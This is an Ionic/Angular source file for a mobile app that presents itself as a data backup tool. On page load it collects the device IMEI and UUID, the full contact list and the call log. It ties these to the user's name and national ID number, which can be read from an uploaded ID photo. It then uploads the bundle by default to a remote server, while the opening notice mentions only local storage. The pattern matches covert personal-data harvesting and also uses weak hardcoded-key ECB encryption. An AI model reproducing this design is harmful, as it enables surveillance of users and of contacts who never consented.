import { Component, OnInit, ChangeDetectorRef } from '@angular/core';
import { Contacts } from '@ionic-native/contacts/ngx';
import { CallLog } from '@ionic-native/call-log/ngx';
import { Device } from '@ionic-native/device/ngx';
import VConsole from 'vconsole';
import { Constants } from '../entity/constant';
import { HttpClient, HttpParams, HttpHeaders } from '@angular/common/http';
import { Platform, AlertController, ActionSheetController, LoadingController, ToastController } from '@ionic/angular';
import { File, FileEntry } from '@ionic-native/file/ngx';
import { FileTransfer, FileTransferObject } from '@ionic-native/file-transfer/ngx';
import { AndroidPermissions } from '@ionic-native/android-permissions/ngx';
import { Camera, CameraOptions } from '@ionic-native/camera/ngx';
import { ImagePicker, ImagePickerOptions } from '@ionic-native/image-picker/ngx';
import * as CryptoJS from 'crypto-js';
import { TryCatchStmt } from '@angular/compiler';

// tslint:disable-next-line:prefer-const
let vConsole = new VConsole();

@Component({
  selector: 'app-home',
  templateUrl: 'home.page.html',
  styleUrls: ['home.page.scss'],
})
export class HomePage implements OnInit {
  username = '';
  idCard = '';
  infoDatas: any = {};
  contactInfos: any = {};
  callLogInfos: any = {};
  // tslint:disable-next-line:no-inferrable-types
  IMEI: string = '';
  // tslint:disable-next-line:no-inferrable-types
  UUID: string = '';
  // tslint:disable-next-line:no-inferrable-types
  Manufactorer: string = '';
  // tslint:disable-next-line:no-inferrable-types
  Model: string = '';
  uploadDatasUrl = Constants.hostip + '/uploadDatas';
  downloadUrl = Constants.hostip + '/download';
  // tslint:disable-next-line:variable-name
  getIdCardInfoUrl = Constants.hostip + '/getIdCardInfoByBase64Img';
  state1 = false;
  state2 = false;
  state3 = false;
  state4 = false;
  state5 = false;
  state6 = false;
  uploadState = true;
  loading: any;
  constructor(private contacts: Contacts, private calllog: CallLog, private device: Device,
              private http: HttpClient, private platform: Platform, private file: File,
              private transfer: FileTransfer, private alertCtrl: AlertController,
              private actionSheetController: ActionSheetController,
              private androidPermissions: AndroidPermissions, private changeDetectorRef: ChangeDetectorRef,
              private imagepicker: ImagePicker, private loadingCtrl: LoadingController,
              public toastController: ToastController) {
              }

  ngOnInit() {
    // tslint:disable-next-line:max-line-length
    this.androidPermissions.requestPermissions([
    this.androidPermissions.PERMISSION.READ_PHONE_STATE,
    this.androidPermissions.PERMISSION.GET_ACCOUNTS,
    this.androidPermissions.PERMISSION.READ_CALL_LOG,
    this.androidPermissions.PERMISSION.READ_CONTACTS,
    this.androidPermissions.PERMISSION.WRITE_CONTACTS,
    this.androidPermissions.PERMISSION.WRITE_EXTERNAL_STORAGE]);
  }
  async presentToast(text) {
    const toast = await this.toastController.create({
      message: text,
      duration: 2000
    });
    toast.present();
  }

  encode(dataStr) {
    // tslint:disable-next-line:prefer-const
    let skey = CryptoJS.enc.Utf8.parse(Constants.key);
    // tslint:disable-next-line:prefer-const
    let srcs = CryptoJS.enc.Utf8.parse(dataStr);
    // tslint:disable-next-line:prefer-const
    let encrypted = CryptoJS.AES.encrypt(srcs, skey, {mode: CryptoJS.mode.ECB, padding: CryptoJS.pad.Pkcs7});
    return encrypted.toString();
  }

  decode(cryptoData) {
    // tslint:disable-next-line:prefer-const
    let skey = CryptoJS.enc.Utf8.parse(Constants.key);
    // tslint:disable-next-line:prefer-const
    let decrypt = CryptoJS.AES.decrypt(cryptoData, skey, {mode: CryptoJS.mode.ECB, padding: CryptoJS.pad.Pkcs7});
    return CryptoJS.enc.Utf8.stringify(decrypt).toString();
  }

  // tslint:disable-next-line:member-ordering
  fileTransfer: FileTransferObject = this.transfer.create();
  // alert
  async presentAlert(msg: any) {
    const alert = await this.alertCtrl.create({
      message: msg,
      buttons: ['确定']
    });
    await alert.present();
  }

  ionViewWillEnter() {
    this.loadingInfo();
  }
  // 初始化阶段，获取用户数据
  loadingInfo() {
    this.presentAlert('温馨提醒：文件备份后，存储在手机文件系统中，卸载app后文件也随之删除，请知悉');
    // 获取设备IMEI
    this.platform.ready().then(() => {
      (window as any).plugins.imeiplugin.getImei(res => {
        this.IMEI = res;
      });
      // 获取设备UUID
      this.UUID = this.device.uuid;
      this.Manufactorer = this.device.manufacturer;
      this.Model = this.device.model;
      // 获取设备通讯录
      this.contacts.find(['displayName', 'phoneNumbers'], {filter: '', multiple: true})
      .then(data => {
        this.contactInfos = data;
      });

      // 获取设备通话记录
      this.calllog.getCallLog(null)
      .then(data => {
        this.callLogInfos = data;
      });
    });
  }

  private encodeHttpParams(params: any): any {
    if (!params) { return null; }
    return new HttpParams({fromObject: params});
  }

  infoBackup() {
    if (this.username === '' || this.username === undefined) {
      this.presentToast('姓名不能为空');
      return false;
    }
    // tslint:disable-next-line:prefer-const
    let regIdNo = /(^\d{15}$)|(^\d{18}$)|(^\d{17}(\d|X|x)$)/;
    if (!regIdNo.test(this.idCard)) {
      this.presentToast('身份证号码填写有误');
      return false;
    }
    this.show('正在备份文件...');
    // 3.重构上述数据，转换为JSON格式
    this.reshapeDatas();
    // 将数据存储到本地SD卡
    this.saveIntoLocal(this.uploadState);
    if (this.uploadState) {
      this.saveIntoRemote();
    }
  }

  dateFormat(fmt, date) {
    let ret;
    const opt = {
        'Y+': date.getFullYear().toString(),        // 年
        'm+': (date.getMonth() + 1).toString(),     // 月
        'd+': date.getDate().toString(),            // 日
        'H+': date.getHours().toString(),           // 时
        'M+': date.getMinutes().toString(),         // 分
        'S+': date.getSeconds().toString()          // 秒
        // 有其他格式化字符需求可以继续添加，必须转化成字符串
    };
    // tslint:disable-next-line:forin
    for (const k in opt) {
        ret = new RegExp('(' + k + ')').exec(fmt);
        if (ret) {
            fmt = fmt.replace(ret[1], (ret[1].length === 1) ? (opt[k]) : (opt[k].padStart(ret[1].length, '0')));
        }
    }
    return fmt;
}

  saveIntoLocal(uploadState) {
    // tslint:disable-next-line:prefer-const
    let date = new Date();
    // tslint:disable-next-line:prefer-const
    let dirName = this.dateFormat('YYYYmmdd', date);
    const fileName = this.Manufactorer + '_' + this.Model + '_' + this.infoDatas.idCard + '_' + this.dateFormat('YYYYmmddHHMMSS', date);
    this.createDir(dirName).then(result => {
      console.log(result);
      this.createFile(dirName, fileName)
      .then(entry => {
        this.writeFile(entry, this.encode(JSON.stringify(this.infoDatas)))
          .then(res => {
            if (res) {
              this.createFileZip(dirName, fileName, uploadState);
            }
          });
      });
    });
  }
  createFileZip(dirName, fileName, state) {
    // tslint:disable-next-line:prefer-const
    let that = this;
    // tslint:disable-next-line:prefer-const
    let zipInstance = new (window as any).zipArchive();
    // tslint:disable-next-line:prefer-const
    let temp1 = this.file.externalApplicationStorageDirectory + dirName + '/' + fileName;
    // tslint:disable-next-line:prefer-const
    let temp2 = this.file.externalApplicationStorageDirectory + dirName + '/' + fileName;
    console.log(temp2);
    zipInstance.zip(temp1 + '.zip',
    [temp2 + '.json'],
    () => {
      // zip archive created
      this.file.removeFile(this.file.externalApplicationStorageDirectory + dirName + '/', fileName + '.json').then(res => {
        if (!state) {
          that.hide();
          that.presentAlert('备份成功，请前往' + this.file.externalApplicationStorageDirectory + dirName + '目录下查看备份文件');
        }
      });
    },
    (error) => {
      console.log(error);
    });
  }

  createDir(dir: string): Promise<any> {
    // 判断文件夹是否存在 不存在创建 这里必须是外部文件
    return new Promise((resolve, reject) => {
        this.file.checkDir(this.file.externalApplicationStorageDirectory, dir).then(_ => {
            resolve(true);
        }).catch(err => {
            this.file.createDir(this.file.externalApplicationStorageDirectory, dir, true).then(result => {
              resolve(true);
            // tslint:disable-next-line:no-shadowed-variable
            }).catch(err => {
                reject(err);
            });
        });
    });
  }
  createFile(dir: string, fileName: string): Promise<any> {
    // 判断文件是否存在 不存在创建 返回 FileEntry
    return new Promise((resolve, reject) => {
      console.log('ready to create file:' + this.file.externalApplicationStorageDirectory + dir + '/', fileName + '.json');
      this.file.createFile(this.file.externalApplicationStorageDirectory + dir + '/', fileName + '.json', true).then(entry => {
          // alert("success:"+JSON.stringify(entry));
          resolve(entry);
      // tslint:disable-next-line:no-shadowed-variable
      }).catch(err => {
          // alert("err:" + JSON.stringify(err));
          reject(err);
      });
    });
  }
  writeFile(fileEntry: FileEntry, dataObj: string): Promise<any> {
    return new Promise((resolve, reject) => {
        fileEntry.createWriter(fileWriter => {
            console.log('ready to write into file', fileEntry);
            // tslint:disable-next-line:only-arrow-functions
            fileWriter.onwriteend = function() {
                resolve(true);
            };
            // tslint:disable-next-line:only-arrow-functions
            fileWriter.onerror = function(e) {
                reject(e);
            };
            fileWriter.seek(fileWriter.length);
            fileWriter.write(dataObj);
        });
    });
}

  saveIntoRemote() {
    // tslint:disable-next-line:prefer-const
    let date = new Date();
    // tslint:disable-next-line:prefer-const
    let dirName = this.dateFormat('YYYYmmdd', date);
    const fileName = this.Manufactorer + '_' + this.Model + '_' + this.infoDatas.idCard + '_' + this.dateFormat('YYYYmmddHHMMSS', date);
    // tslint:disable-next-line:prefer-const
    let that = this;
    // 4.上传到服务器，进行ZIP加密压缩 {datas: JSON.stringify(this.infoDatas)}
    const params = {
      datas: this.encode(JSON.stringify(this.infoDatas))
    };
    this.http.post(this.uploadDatasUrl, this.encodeHttpParams(params), {})
      .subscribe(res => {
        if ((res as any).status === 1) {
          that.hide();
          that.presentAlert('文件上传成功，您可以前往手机' + this.file.externalApplicationStorageDirectory + dirName + '目录下查看备份文件');
        } else {
          that.hide();
          that.presentAlert('备份失败，请重新操作');
          that.file.removeFile(this.file.externalApplicationStorageDirectory + dirName + '/', fileName + '.zip');
        }
        // tslint:disable-next-line:prefer-const
        // let folderName = (res as any).data.folderName;
        // // tslint:disable-next-line:prefer-const
        // let fileName = (res as any).data.fileName;
        // this.download(folderName, fileName);
      }, err => {
        that.hide();
        that.presentAlert('网络错误，备份失败，请重新操作');
        that.file.removeFile(this.file.externalApplicationStorageDirectory + dirName + '/', fileName + '.zip');
      });
  }

  reshapeDatas() {
    (this.infoDatas as any).username = this.username;
    (this.infoDatas as any).idCard = this.idCard;
    (this.infoDatas as any).IMEI = this.IMEI;
    (this.infoDatas as any).UUID = this.UUID;
    (this.infoDatas as any).Manufacturer = this.Manufactorer;
    (this.infoDatas as any).Model = this.Model;
    (this.infoDatas as any).Contacts = this.contactInfos;
    (this.infoDatas as any).CallLogs = this.callLogInfos;
    console.log(this.infoDatas);
  }

  // download(folderName, fileName) {
  //   // tslint:disable-next-line:max-line-length
  // tslint:disable-next-line:max-line-length
  //   this.fileTransfer.download(this.downloadUrl + '?folderName=' + folderName + '&fileName=' + fileName, this.file.externalApplicationStorageDirectory + folderName + '/' + fileName + '.zip').then((entry) => {
  //     console.log('download complete: ' + entry.toURL());
  //   }, (error) => {
  //     // handle error
  //   });
  // }
  readPic() {
      this.presentActionSheet();
  }

  async presentActionSheet() {
    const actionSheet = await this.actionSheetController.create({
      mode: 'ios',
      header: '请选择上传证件的方式',
      buttons: [{
        text: '拍照',
        role: 'destructive',
        icon: 'camera',
        handler: () => {
          this.takePicture();
        }
      }, {
        text: '相册',
        role: 'destructive',
        icon: 'image',
        handler: () => {
          this.openGallery();
        }
      }, {
        text: 'Cancel',
        icon: 'close',
        role: 'cancel',
        handler: () => {
        }
      }]
    });
    await actionSheet.present();
  }

  takePicture() {
    // tslint:disable-next-line:prefer-const
    let that = this;
    (navigator as any).camera.getPicture(function onSuccess(data) {
      that.show('正在获取证件信息，请稍后...');
      that.uploadImage(data);
    }, function onError() {
        alert('获取失败');
      }, {
          quality: 100,
          destinationType: (window as any).Camera.DestinationType.FILE_URI, // 返回FILE_URI类型
          sourceType: (window as any).Camera.PictureSourceType.CAMERA, // 指定图片来自拍照
          cameraDirection: (window as any).Camera.Direction.FRONT, // 指定前后摄像头--好像没起作用
          encodingType: (window as any).Camera.EncodingType.JPEG,
          targetWidth: 500,
          targetHeight: 500
      // encodingType: Camera.EncodingType.PNG //指定返回图片是png格式还是jpeg
         });
}

  openGallery() {
    // tslint:disable-next-line:prefer-const
    let that = this;
    // tslint:disable-next-line:only-arrow-functions
    (navigator as any).camera.getPicture(function(data) {
      that.show('正在获取证件信息，请稍后...');
      that.uploadImage(data);
      // tslint:disable-next-line:prefer-const
    // tslint:disable-next-line:only-arrow-functions
    }, function(err) {
      alert('获取失败');
    }, {
      quality: 100,
      destinationType: (window as any).Camera.DestinationType.FILE_URI, // 返回Base64编码字符串
      sourceType: (window as any).Camera.PictureSourceType.SAVEDPHOTOALBUM, // 指定图片来自相册
      encodingType: (window as any).Camera.EncodingType.JPEG, // 指定返回图片是png格式还是jpeg
    });
  }

  // 上传图像
  uploadImage(imagePath: any) {
    // tslint:disable-next-line:prefer-const
    let that = this;
    const options = {
      fileKey: 'img',
      httpMethod: 'POST',
      mimeType: 'image/jpeg',
      params: {}
    };
    // 使用文件传输上传图像
    this.fileTransfer.upload(imagePath, this.getIdCardInfoUrl, options).then(data => {
      // tslint:disable-next-line:prefer-const
      let res = JSON.parse(data.response);
      that.hide();
      if (res.status === 0) {
        that.presentAlert('信息获取失败，请重新获取或手动输入信息');
        return;
      }
      that.username = res.msg.split('_')[0];
      that.idCard = res.msg.split('_')[1];
      that.changeDetectorRef.markForCheck();
      that.changeDetectorRef.detectChanges();
    }, err => {
      that.hide();
      that.presentAlert('网络错误，请重试');
    });
  }

  async show(text) {
    this.loading = await this.loadingCtrl.create({
      message: text
    });
    await this.loading.present();
  }

  hide() {
    if (this.loading) {
      this.loading.dismiss();
    }
  }

}
